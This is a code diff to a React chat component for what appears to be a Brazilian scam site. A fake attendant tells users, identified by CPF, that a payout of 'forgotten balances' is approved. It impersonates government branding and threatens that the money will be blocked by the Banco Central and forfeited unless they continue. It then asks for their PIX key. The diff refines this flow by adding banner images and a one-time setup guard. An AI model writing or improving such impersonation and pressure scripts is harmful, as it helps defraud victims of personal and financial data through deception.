@@ -43,7 +43,12 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
     endOfMessagesRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [messages, typing]);
 
+  const hasSetup = useRef(false);
+
   useEffect(() => {
+    if (hasSetup.current) return;
+    hasSetup.current = true;
+
     const setupChat = async () => {
       // Sorteia uma atendente
       const attendants = [
@@ -77,21 +82,21 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setLeadValue(formattedVal);
         
         setTyping(false);
-        addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/meu_govbr.png");
+        addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
         
         // Show second message after 2 seconds
         setTimeout(() => {
           setTyping(true);
           setTimeout(() => {
             setTyping(false);
-            addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`);
+            addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`, undefined, "/assets/banners/banner_atencao.png");
             
             // Show third message after 2 seconds
             setTimeout(() => {
               setTyping(true);
               setTimeout(() => {
                 setTyping(false);
-                addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`);
+                addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
                 setAwaitingPix(true);
               }, 1500);
             }, 2000);
